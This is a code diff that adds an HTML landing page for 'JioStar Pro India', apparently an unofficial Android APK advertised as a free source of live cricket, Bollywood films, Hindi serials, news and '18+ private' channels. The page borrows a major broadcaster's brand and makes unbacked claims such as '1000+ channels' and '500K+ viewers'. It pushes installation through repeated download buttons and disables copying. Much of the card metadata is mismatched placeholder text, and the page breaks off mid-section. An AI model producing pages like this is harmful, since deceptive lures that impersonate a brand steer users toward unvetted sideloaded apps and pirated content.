@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+
+    <!-- 浏览器标签页标题 -->
+    <title>JioStar Pro India</title>
+
+    <!-- 浏览器标签页小图标 -->
+    <link rel="icon" href="11.png" type="image/png">
+    <style>
+        /* --- 1. 基础全局样式 --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #06070d; color: #fff; padding-top: 64px; padding-bottom: 0; overflow-x: hidden; width: 100vw; }
+
+        /* 隐藏全局滚动条 */
+        ::-webkit-scrollbar { display: none; }
+
+        /* --- 防抄袭：禁用页面文本选中 --- */
+        body {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        /* --- 2. 导航栏 --- */
+        .header {
+            position: fixed; top: 0; left: 0; width: 100%; height: 64px;
+            background: rgba(10, 11, 16, 0.95); backdrop-filter: blur(20px);
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0 20px; z-index: 9999;
+        }
+        .header::after {
+            content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px;
+            background: linear-gradient(90deg, #FF9933 0%, #FF9933 33%, #FFFFFF 33%, #FFFFFF 66%, #138808 66%, #138808 100%);
+        }
+        .logo-wrapper { display: flex; align-items: center; gap: 10px; }
+
+        /* 修改了 Logo 样式，专门适配图片链接 */
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            box-shadow: 0 0 12px rgba(255,153,51,0.3);
+            object-fit: cover;
+            background-color: #111; /* 图片未加载时的底色 */
+        }
+
+        .logo-text { font-weight: 900; font-size: 20px; letter-spacing: -0.5px; }
+        .logo-text span { color: #FF9933; }
+
+        .nav-right { display: flex; align-items: center; gap: 12px; }
+        .lang-badge { background: #FF9933; color: #fff; border:none; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 800; cursor: pointer;}
+        .guide-btn { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid rgba(255,255,255,0.15); padding: 6px 16px; border-radius: 20px; font-size: 11px; font-weight: 700; cursor: pointer; transition: 0.2s;}
+
+        /* --- 3. 核心 Hero 卡片 --- */
+        .hero-container { padding: 12px; width: 100%; max-width: 900px; margin: 0 auto; }
+        .hero-card {
+            width: 100%; border-radius: 24px; position: relative;
+            padding: 40px 16px 30px; text-align: center; overflow: hidden;
+            border: 1px solid rgba(255, 153, 51, 0.15);
+            background-color: #0c0d14;
+            background-image:
+                    radial-gradient(circle at 0% 0%, rgba(255, 153, 51, 0.35) 0%, transparent 70%),
+                    radial-gradient(circle at 100% 100%, rgba(19, 136, 8, 0.35) 0%, transparent 70%);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+        .hero-tag { display: inline-flex; align-items: center; gap: 6px; font-size: 10px; color: #b7a99a; font-weight: 600; border: 1px solid rgba(255,153,51,0.3); background: rgba(255,153,51,0.05); padding: 4px 14px; border-radius: 20px; margin-bottom: 18px; text-transform: uppercase; }
+        .hero-tag .dot { width: 5px; height: 5px; background: #2ecc71; border-radius: 50%; box-shadow: 0 0 6px #2ecc71; }
+        .hero-title { font-size: 24px; font-weight: 900; line-height: 1.3; margin-bottom: 12px; color: #fff; letter-spacing: -0.5px; }
+        .hero-title span.gold { color: #FFB347; }
+        .hero-title span.sub-row { display: block; font-size: 18px; color: #e2e8f0; margin-top: 6px; }
+        .hero-sub { font-size: 12px; font-weight: 500; margin-bottom: 25px; color: #8892b0; line-height: 1.6; max-width: 600px; margin-left: auto; margin-right: auto; }
+
+        .main-btn {
+            background: linear-gradient(90deg, #FFB347 0%, #FF9933 45%, #138808 100%);
+            color: #111; border: none; padding: 15px 40px; border-radius: 30px;
+            font-size: 15px; font-weight: 900; display: inline-flex; align-items: center; gap: 10px;
+            box-shadow: 0 10px 30px rgba(255, 153, 51, 0.25); cursor: pointer; width: 90%; max-width: 340px; justify-content: center;
+            animation: bounce 2.0s infinite;
+        }
+
+        .stats-grid { display: flex; justify-content: center; gap: 30px; margin-top: 25px; flex-wrap: wrap; }
+        .stat-box { text-align: center; }
+        .stat-num { font-size: 17px; font-weight: 900; display: block; color: #fff; margin-bottom: 2px;}
+        .stat-txt { font-size: 9px; color: #64748b; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }
+
+        /* --- 4. 轮播部分 --- */
+        .section-container { max-width: 100vw; overflow: hidden; }
+        .section-header { padding: 15px 16px 8px; display: flex; justify-content: space-between; align-items: center; max-width: 900px; margin: 0 auto;}
+        .title-group { display: flex; flex-direction: column; gap: 4px; max-width: 75%; }
+        .main-title { font-size: 17px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 6px; }
+        .sub-title { font-size: 11px; color: #888; }
+        .in-app { color: #f3c623; font-size: 12px; font-weight: 700; background: rgba(243,198,35,0.1); padding: 6px 14px; border-radius: 999px; border: 1px solid rgba(243, 198, 35, 0.3); white-space: nowrap; transition: all 0.2s; cursor: pointer;}
+
+        .carousel-container {
+            width: 100%; display: flex; overflow-x: auto; overflow-y: hidden;
+            -webkit-overflow-scrolling: touch; padding-bottom: 15px; scrollbar-width: none;
+        }
+        .carousel-container::-webkit-scrollbar { display: none; }
+        .carousel-track { display: flex; gap: 12px; padding: 0 16px; width: max-content; }
+
+        /* 基础竖卡片样式 */
+        .card-item { width: 140px; flex-shrink: 0; display: flex; flex-direction: column; gap: 8px; cursor: pointer; }
+
+        /* 宽体横卡片样式（作用于体育和新闻区） */
+        .card-item.wide { width: 260px; }
+
+        .poster {
+            width: 100%; aspect-ratio: 2/3; border-radius: 12px;
+            background: #1a1a1a; overflow: hidden; position: relative;
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: 0 8px 15px rgba(0,0,0,0.3);
+        }
+        .card-item.wide .poster { aspect-ratio: 16/9; }
+        /* 防拖拽图片 */
+        .poster img { width: 100%; height: 100%; object-fit: cover; pointer-events: none; }
+
+        .tag-hot, .tag-free, .tag-hd, .tag-18, .tag-vip { position: absolute; top: 8px; font-size: 9px; padding: 2px 6px; border-radius: 4px; font-weight: 900; z-index: 2; }
+        .tag-hot { left: 8px; background: #e74c3c; color: #fff;}
+        .tag-hd { left: 8px; background: #f3c623; color: #000; }
+        .tag-18 { left: 8px; background: #ff3f72; color: #fff; }
+        .tag-vip { left: 8px; background: #8e44ad; color: #fff; }
+        .tag-free { right: 8px; background: #2ecc71; color: #000; }
+
+        .card-title { font-size: 13px; font-weight: 800; color: #f8fafc; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .card-meta { font-size: 10px; color: #64748b; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+
+        .divider {
+            height: 1px; width: 100%; max-width: 900px; margin: 5px auto 0px;
+            background: linear-gradient(90deg, transparent, rgba(255, 153, 51, 0.4) 20%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 153, 51, 0.4) 80%, transparent);
+            position: relative;
+        }
+        .divider::after { content: '◆'; position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); background: #06070d; padding: 0 12px; color: rgba(255, 153, 51, 0.8); font-size: 10px; }
+
+        .icon-img { width: 20px; height: 20px; display: inline-block; vertical-align: middle; }
+
+        /* --- 7. Why BM TV India 区 --- */
+        .why-section {
+            width: 100%;
+            max-width: 460px;
+            margin: 35px auto 20px;
+            padding: 0 16px;
+        }
+
+        .why-title {
+            font-size: 20px;
+            font-weight: 900;
+            color: #fff;
+            margin-bottom: 18px;
+            letter-spacing: -0.4px;
+        }
+
+        .why-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .why-card {
+            min-height: 130px;
+            border-radius: 14px;
+            background: rgba(255,255,255,0.045);
+            border: 1px solid rgba(255,255,255,0.12);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 18px 12px;
+            text-align: center;
+        }
+
+        .why-icon {
+            font-size: 26px;
+            margin-bottom: 14px;
+            line-height: 1;
+        }
+
+        .why-card-title {
+            font-size: 14px;
+            font-weight: 900;
+            color: #fff;
+            margin-bottom: 7px;
+        }
+
+        .why-card-text {
+            font-size: 11px;
+            color: #b8b8b8;
+            line-height: 1.45;
+            max-width: 150px;
+        }
+        /* --- 8. Start Your India TV Room 模块 --- */
+        .start-room-section {
+            width: calc(100% - 32px);
+            max-width: 1200px;
+            margin: 42px auto 55px;
+            padding: 34px 20px 30px;
+            border-radius: 18px;
+            background: rgba(255,255,255,0.035);
+            border: 1px solid rgba(255,153,51,0.22);
+            text-align: center;
+        }
+
+        .start-title {
+            font-size: 22px;
+            font-weight: 900;
+            color: #f8fafc;
+            margin-bottom: 10px;
+            letter-spacing: -0.4px;
+        }
+
+        .start-subtitle {
+            font-size: 13px;
+            color: #b8b8b8;
+            margin-bottom: 24px;
+        }
+
+        .start-stats {
+            display: flex;
+            justify-content: center;
+            gap: 28px;
+            margin-bottom: 24px;
+        }
+
+        .start-stat {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .start-stat span {
+            font-size: 20px;
+            font-weight: 900;
+            color: #179b17;
+            line-height: 1;
+        }
+
+        .start-stat small {
+            font-size: 9px;
+            color: #b8b8b8;
+            font-weight: 700;
+            margin-top: 7px;
+        }
+
+        .start-btn {
+            border: none;
+            border-radius: 12px;
+            padding: 15px 42px;
+            background: linear-gradient(90deg, #ffad3d 0%, #39a900 100%);
+            color: #050505;
+            font-size: 16px;
+            font-weight: 900;
+            letter-spacing: 0.4px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            box-shadow: 0 12px 32px rgba(57,169,0,0.28);
+        }
+
+        /* --- 9. Quick APK Install Guide 模块 --- */
+        .install-guide-section {
+            width: calc(100% - 32px);
+            max-width: 1200px;
+            margin: 0 auto 55px;
+        }
+
+        .guide-title {
+            font-size: 20px;
+            font-weight: 900;
+            color: #f8fafc;
+            margin-bottom: 18px;
+        }
+
+        .guide-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .guide-step {
+            min-height: 78px;
+            border-radius: 12px;
+            background: rgba(255,255,255,0.035);
+            border: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 16px;
+        }
+
+        .step-num {
+            width: 32px;
+            height: 32px;
+            border-radius: 9px;
+            background: #ffad3d;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 900;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .step-content h3 {
+            font-size: 15px;
+            font-weight: 900;
+            color: #fff;
+            margin-bottom: 7px;
+        }
+
+        .step-content p {
+            font-size: 12px;
+            color: #d0d0d0;
+            line-height: 1.45;
+        }
+
+        /* 移动端优化 */
+        @media (max-width: 480px) {
+            .start-room-section {
+                margin-top: 35px;
+                padding: 30px 16px 28px;
+            }
+
+            .start-title {
+                font-size: 20px;
+            }
+
+            .start-subtitle {
+                font-size: 12px;
+                line-height: 1.5;
+            }
+
+            .start-stats {
+                gap: 22px;
+            }
+
+            .start-btn {
+                width: 82%;
+                max-width: 280px;
+                padding: 15px 20px;
+                font-size: 15px;
+            }
+
+            .guide-step {
+                padding: 15px;
+            }
+        }
+        /* --- 底部全局固定下载按钮 --- */
+        .fixed-download-bar {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            padding: 8px 16px calc(8px + env(safe-area-inset-bottom));
+            background: rgba(6, 7, 13, 0.82);
+            backdrop-filter: blur(16px);
+            z-index: 99999;
+        }
+
+        .fixed-download-btn {
+            width: 100%;
+            height: 48px;
+            border: none;
+            border-radius: 999px;
+            background: linear-gradient(
+                    90deg,
+                    rgba(255, 199, 106, 0.82) 0%,
+                    rgba(255, 178, 87, 0.82) 38%,
+                    rgba(82, 196, 26, 0.82) 100%
+            );
+            color: #111;
+            font-size: 15px;
+            font-weight: 900;
+            letter-spacing: 0.3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            box-shadow: 0 -3px 16px rgba(82, 196, 26, 0.12);
+        }
+        /* --- 10. FAQ 常见问题模块 --- */
+        .faq-section {
+            width: calc(100% - 16px);
+            max-width: 1200px;
+            margin: 20px auto 35px;
+        }
+
+        .faq-title {
+            font-size: 20px;
+            font-weight: 900;
+            color: #fff;
+            margin-bottom: 16px;
+        }
+
+        .faq-list {
+            display: flex;
+            flex-direction: column;
+            gap: 9px;
+        }
+
+        .faq-item {
+            border-radius: 10px;
+            background: rgba(255,255,255,0.035);
+            border: 1px solid rgba(255,255,255,0.1);
+            overflow: hidden;
+        }
+
+        .faq-question {
+            width: 100%;
+            min-height: 58px;
+            padding: 0 18px;
+            border: none;
+            background: transparent;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 14px;
+            cursor: pointer;
+            text-align: left;
+        }
+
+        .faq-question span {
+            font-size: 14px;
+            font-weight: 900;
+        }
+
+        .faq-question b {
+            font-size: 18px;
+            color: #c9bda7;
+            transition: transform 0.2s ease;
+        }
+
+        .faq-answer {
+            display: none;
+            padding: 0 18px 16px;
+            font-size: 12px;
+            line-height: 1.55;
+            color: #b8b8b8;
+        }
+
+        .faq-item.active .faq-answer {
+            display: block;
+        }
+
+        .faq-item.active .faq-question b {
+            transform: rotate(45deg);
+        }
+
+        /* --- 页面底部版权 --- */
+        .site-footer {
+            width: 100%;
+            padding: 18px 8px 50px;
+            text-align: center;
+            color: rgba(255,255,255,0.28);
+            font-size: 11px;
+        }
+
+        .footer-line {
+            height: 4px;
+            width: 100vw;
+            margin: 0 0 16px;
+            position: relative;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(
+                    90deg,
+                    #ff9933 0%,
+                    #ff9933 33%,
+                    #ffffff 33%,
+                    #ffffff 66%,
+                    #138808 66%,
+                    #138808 100%
+            );
+        }
+        .download-info {
+            font-size: 11px;
+            color: #d0d0d0;
+            text-align: center;
+            margin-top: 6px; /* 和按钮保持间距 */
+            line-height: 1.3;
+        }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+    </style>
+</head>
+<!-- ================= 底部固定下载按钮 ================= -->
+<div class="fixed-download-bar">
+    <button class="fixed-download-btn">
+        <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24">
+            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+        </svg>
+        Download JioStar Pro  — 100% Free
+    </button>
+    <!-- 新增说明文字 -->
+    <p class="download-info">Android • 11MB • No Signup • No Subscription</p>
+</div>
+<!-- 防抄袭：禁用右键菜单、拖拽图像、文本选中 -->
+<body oncontextmenu="return false" ondragstart="return false" onselectstart="return false">
+
+<header class="header">
+    <div class="logo-wrapper">
+        <img class="logo-icon" src="11.png" alt="Logo">
+        <div class="logo-text">JioStar <span>Pro</span></div>
+    </div>
+    <div class="nav-right">
+        <button class="lang-badge">EN</button>
+        <button class="guide-btn">Install Guide</button>
+    </div>
+</header>
+
+<div class="hero-container">
+    <section class="hero-card">
+        <div class="hero-tag"><span class="dot"></span>INDIA LIVE • Cricket • Bollywood • Free Forever</div>
+        <h1 class="hero-title">
+            JioStar Pro India — <span class="gold">Live Cricket,</span><br>
+            <span class="gold">Bollywood Movies,</span> Hindi Serials & News<br>
+            <span class="sub-row">— Fast APK, HD Streaming, 100% Free</span>
+        </h1>
+        <div class="hero-sub">Made for Indian viewers: IPL-style match nights, Bollywood premieres, Hindi dramas, live news, finance and private channels inside one Android app.</div>
+
+        <button class="main-btn">
+            <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+            Install JioStar Pro
+        </button>
+
+        <div class="stats-grid">
+            <div class="stat-box"><span class="stat-num">1000+</span><span class="stat-txt">Channels</span></div>
+            <div class="stat-box"><span class="stat-num">4K</span><span class="stat-txt">HD/4K</span></div>
+            <div class="stat-box"><span class="stat-num">500K+</span><span class="stat-txt">Viewers</span></div>
+            <div class="stat-box"><span class="stat-num">FREE</span><span class="stat-txt">Always Free</span></div>
+        </div>
+    </section>
+</div>
+
+<!-- ================= 1. 影视区 ================= -->
+<div class="section-container">
+    <div class="section-header">
+        <div class="title-group">
+            <div class="main-title"><img class="icon-img" src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f3ac.png" alt="movie"> Hindi Dramas & Bollywood Hot Picks</div>
+            <div class="sub-title">StarPlus-style drama, family stories, and fresh Bollywood picks</div>
+        </div>
+        <div class="in-app">In App →</div>
+    </div>
+    <div class="carousel-container" data-speed="0.8">
+        <div class="carousel-track">
+            <div class="card-item"><div class="poster"><span class="tag-hot" style="background:#8e44ad">NEW</span><span class="tag-free">FREE</span><img src="27.jpg"></div><div class="card-title">Emotional Family Drama</div><div class="card-meta">Brahmastra Part 2 Entertainment/Drama</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-hot" style="background:#3498db">NEW</span><span class="tag-free">FREE</span><img src="44.jpg"></div><div class="card-title">Reality Show Teaser</div><div class="card-meta">Animal Park Entertainment/Reality TV</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-hot">HOT</span><span class="tag-free">FREE</span><img src="29.jpg"></div><div class="card-title">Coastal Journey Poster</div><div class="card-meta">Anupamaa New Episodes Entertainment/Drama</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-hd">4K</span><span class="tag-free">FREE</span><img src="30.jpg"></div><div class="card-title">Period Drama Series</div><div class="card-meta">Bigg Boss Weekend Specials Entertainment/Streaming</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-hot">LIVE</span><span class="tag-free">FREE</span><img src="31.jpg"></div><div class="card-title">Soap Opera Promo</div><div class="card-meta">Don 4 Entertainment/Television</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-hd">HD</span><span class="tag-free">FREE</span><img src="43.jpg"></div><div class="card-title">Action Thriller Announcement</div><div class="card-meta">《Jana Nayagan》 Entertainment/News</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-hd">4K</span><span class="tag-free">FREE</span><img src="33.jpg"></div><div class="card-title">Bank Heist Cinematic</div><div class="card-meta">Yeh Rishta Kya Kehlata Hai Entertainment/Action</div></div>
+        </div>
+    </div>
+    <div class="divider"></div>
+</div>
+
+<!-- ================= 2. 体育区 ================= -->
+<div class="section-container">
+    <div class="section-header">
+        <div class="title-group">
+            <div class="main-title"><img class="icon-img" src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f3cf.png" alt="cricket"> IPL, Cricket & Match Night Live</div>
+            <div class="sub-title">IPL • India tour • Asia Cup • football — match-night ready</div>
+        </div>
+        <div class="in-app">In App →</div>
+    </div>
+    <div class="carousel-container" data-speed="0.6">
+        <div class="carousel-track">
+            <div class="card-item wide"><div class="poster"><span class="tag-hot" style="background:#e74c3c">LIVE</span><span class="tag-free">FREE</span><img src="23.jpg"></div><div class="card-title">Night Cricket Action</div><div class="card-meta">NFL Super Bowl LX Sports/Cricket</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hot" style="background:#e74c3c">LIVE</span><span class="tag-free">FREE</span><img src="24.jpg"></div><div class="card-title">Soccer Match Clash</div><div class="card-meta">Tennis Grand Slam Sports/Football</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hd">4K</span><span class="tag-free">FREE</span><img src="25.jpg"></div><div class="card-title">Local Cricket Match</div><div class="card-meta">UEFA Champions League Sports/Cricket</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hot" style="background:#e74c3c">LIVE</span><span class="tag-free">FREE</span><img src="26.jpg"></div><div class="card-title">Pro Kabaddi Tackle</div><div class="card-meta">UFC & WWE Sports/Kabaddi</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hd">HD</span><span class="tag-free">FREE</span><img src="35.png"></div><div class="card-title">Baseball India Campaign</div><div class="card-meta">Sports/Poster</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hd">4K</span><span class="tag-free">FREE</span><img src="36.jpg"></div><div class="card-title">Cricket Playoffs Promo</div><div class="card-meta">HJOhutzaQAASDx8 Sports/Design</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hot" style="background:#e74c3c">LIVE</span><span class="tag-free">FREE</span><img src="37.jpg"></div><div class="card-title">Cricket Final Showdown</div><div class="card-meta">Sports/Design</div></div>
+        </div>
+    </div>
+    <div class="divider"></div>
+</div>
+
+<!-- ================= 3. 新闻区 (重点修改处：已加上 wide 宽体类名) ================= -->
+<div class="section-container">
+    <div class="section-header">
+        <div class="title-group">
+            <div class="main-title"><img class="icon-img" src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4fa.png" alt="news"> India News, Markets & Daily Briefing</div>
+            <div class="sub-title">Hindi + English bulletins, markets, weather and breaking updates</div>
+        </div>
+        <div class="in-app">In App →</div>
+    </div>
+    <div class="carousel-container" data-speed="0.9">
+        <div class="carousel-track">
+            <!-- 给这 7 个卡片都加上了 wide，现在它们和体育区一样宽了 -->
+            <div class="card-item wide"><div class="poster"><span class="tag-hot">HOT</span><span class="tag-free">FREE</span><img src="18.jpg"></div><div class="card-title">Global News Update</div><div class="card-meta">NDTV 24x7 Broadcasting/News</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hd">4K</span><span class="tag-free">FREE</span><img src="19.jpg"></div><div class="card-title">Sports Desk Analysis</div><div class="card-meta">Sports India Desk Broadcasting/Sports</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hot">LIVE</span><span class="tag-free">FREE</span><img src="20.jpg"></div><div class="card-title">Prime Time Bulletin</div><div class="card-meta">Business Today Broadcasting/News</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hd">HD</span><span class="tag-free">FREE</span><img src="21.jpg"></div><div class="card-title">Live Field Report</div><div class="card-meta">World Desk India Broadcasting/Live News</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hd">4K</span><span class="tag-free">FREE</span><img src="22.jpg"></div><div class="card-title">European Weather Forecast</div><div class="card-meta">The Weather Channel Broadcasting/Weather</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-hot">LIVE</span><span class="tag-free">FREE</span><img src="38.jpg"></div><div class="card-title">Stage Dance Competition</div><div class="card-meta">Mirzapur New Season Entertainment/Dance</div></div>
+            <div class="card-item wide"><div class="poster"><span class="tag-vip">NEW</span><span class="tag-free">FREE</span><img src="39.jpg"></div><div class="card-title">Live Concert Stage</div><div class="card-meta">Panchayat Specials Entertainment/Music</div></div>
+        </div>
+    </div>
+    <div class="divider"></div>
+</div>
+
+<!-- ================= 4. 午夜影院区 ================= -->
+<div class="section-container">
+    <div class="section-header">
+        <div class="title-group">
+            <div class="main-title"><img class="icon-img" src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f319.png" alt="night"> Night Cinema Collection</div>
+            <div class="sub-title">Movies, thrillers and private late-night picks for quiet viewing</div>
+        </div>
+        <div class="in-app">In App →</div>
+    </div>
+    <div class="carousel-container" data-speed="0.7">
+        <div class="carousel-track">
+            <div class="card-item"><div class="poster"><span class="tag-18">NIGHT</span><span class="tag-free">FREE</span><img src="12.jpg"></div><div class="card-title">Coastal Glow</div><div class="card-meta">After-Hours Lifestyle/Portrait</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-18">NOIR</span><span class="tag-free">FREE</span><img src="13.jpg"></div><div class="card-title">Urban Night Lounge</div><div class="card-meta">City Noir Lifestyle/Romance</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-18">NIGHT</span><span class="tag-free">FREE</span><img src="14.jpg"></div><div class="card-title">Evening Wine</div><div class="card-meta">Late Romance Lifestyle/Portrait</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-hd">HD</span><span class="tag-free">FREE</span><img src="15.jpg"></div><div class="card-title">Intimate Evening</div><div class="card-meta">Midnight Cinema Romance/Lifestyle</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-18">NEW</span><span class="tag-free">FREE</span><img src="16.jpg"></div><div class="card-title">Sun-Kissed Lounging</div><div class="card-meta">Moonlight Drama Lifestyle/Portrait</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-18">HOT</span><span class="tag-free">FREE</span><img src="17.jpg"></div><div class="card-title">Casual Satin</div><div class="card-meta">Neon Crime Portrait/Fashion</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-hd">4K</span><span class="tag-free">FREE</span><img src="40.jpg"></div><div class="card-title">Fashion Editorial</div><div class="card-meta">Disha Patani Fashion/Editorial</div></div>
+        </div>
+    </div>
+    <div class="divider"></div>
+</div>
+
+<!-- ================= 5. 18+ 私密房区 ================= -->
+<div class="section-container">
+    <div class="section-header">
+        <div class="title-group">
+            <div class="main-title"><img class="icon-img" src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f51e.png" alt="18+"> 18+ Private Adult Room</div>
+            <div class="sub-title">Adults only • discreet private channels unlocked inside BM TV</div>
+        </div>
+        <div class="in-app">In App →</div>
+    </div>
+    <div class="carousel-container" data-speed="0.85">
+        <div class="carousel-track">
+            <div class="card-item"><div class="poster"><span class="tag-18">NEW</span><span class="tag-free">18+</span><img src="1.jpg"></div><div class="card-title">Morning Activewear</div><div class="card-meta">After Dark 18+ Fitness/Lifestyle</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-18">18+</span><span class="tag-free">FREE</span><img src="2.jpg"></div><div class="card-title">Golden Summer</div><div class="card-meta">HI760zyXAAANyw2 Swimwear/Fashion</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-18">18+</span><span class="tag-free">HD</span><img src="3.jpg"></div><div class="card-title">Casual Beauty</div><div class="card-meta">Hidden Suite Portrait/Casual</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-18">18+</span><span class="tag-free">FREE</span><img src="4.jpg"></div><div class="card-title">Couples Workout</div><div class="card-meta">Night Desire Fitness/Romance</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-vip">VIP</span><span class="tag-free">18+</span><img src="5.jpg"></div><div class="card-title">Weekend Relaxation</div><div class="card-meta">Private Lounge Lifestyle/Casual</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-18">18+</span><span class="tag-free">4K</span><img src="6.jpg"></div><div class="card-title">Morning Coffee</div><div class="card-meta">Secret Channel Lifestyle/Portrait</div></div>
+            <div class="card-item"><div class="poster"><span class="tag-18">HOT</span><span class="tag-free">18+</span><img src="7.jpg"></div><div class="card-title">Midnight Elegance</div><div class="card-meta">Velvet Room Portrait/Lifestyle</div></div>
+        </div>
+    </div>
+    <div class="divider"></div>
+</div>
+<!-- ================= 18+以上观看 私密区 ================= -->
+<!--</div> <div class="divider"></div>-->
+<!--</div> <div class="section-container">-->
+<div class="section-header">
+    <div class="title-group">
+        <div class="main-title">🔒 Private 18+ Channels</div>
+        <div class="sub-title">Adults Only • Private Viewing</div>
+    </div>
+    <div class="in-app">In App →</div>
+</div>
+<div class="carousel-container" data-speed="0.82">
+    <div class="carousel-track">
+        <div class="card-item"><div class="poster"><span class="tag-18">NEW</span><span class="tag-free">18+</span><img src="45.jpg"></div><div class="card-title">Bedroom Diva</div><div class="card-meta">Hot Desire / Adult Glamour</div></div>
+        <div class="card-item"><div class="poster"><span class="tag-18">18+</span><span class="tag-free">FREE</span><img src="46.jpg"></div><div class="card-title">Pink Desire</div><div class="card-meta">Soft Glam / Bedroom Romance</div></div>
+        <div class="card-item"><div class="poster"><span class="tag-18">18+</span><span class="tag-free">HD</span><img src="47.jpg"></div><div class="card-title">Couple Moments</div><div class="card-meta">Private Love / Hot Romance</div></div>
+        <div class="card-item"><div class="poster"><span class="tag-18">18+</span><span class="tag-free">FREE</span><img src="48.jpg"></div><div class="card-title">Asian Beauty</div><div class="card-meta">Soft Fitness / Bedroom Glam</div></div>
+        <div class="card-item"><div class="poster"><span class="tag-vip">VIP</span><span class="tag-free">18+</span><img src="49.jpg"></div><div class="card-title">Triple Desire</div><div class="card-meta">Luxury Room / Adult Romance</div></div>
+        <div class="card-item"><div class="poster"><span class="tag-18">18+</span><span class="tag-free">4K</span><img src="50.jpg"></div><div class="card-title">City Beauty</div><div class="card-meta">Window View / Glamour Mood</div></div>
+        <div class="card-item"><div class="poster"><span class="tag-18">HOT</span><span class="tag-free">18+</span><img src="51.jpg"></div><div class="card-title">Midnight Passion</div><div class="card-meta">Private Party / Hot Romance</div></div>
+    </div>
+
+</div>
+<div class="divider"></div>
+</div>
+<div class="section-container" style="padding-bottom: 40px;">
+
+    <!-- ================= 6. 金融/市场区 ================= -->
+    <div class="section-container" style="padding-bottom: 40px;">
+        <div class="section-header">
+            <div class="title-group">
+                <div class="main-title"><img class="icon-img" src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4c8.png" alt="finance"> Markets, Finance & Signals</div>
+                <div class="sub-title">Stocks • crypto • forex • commodities • policy headlines</div>
+            </div>
+            <div class="in-app">In App →</div>
+        </div>
+        <div class="carousel-container" data-speed="0.75">
+            <div class="carousel-track">
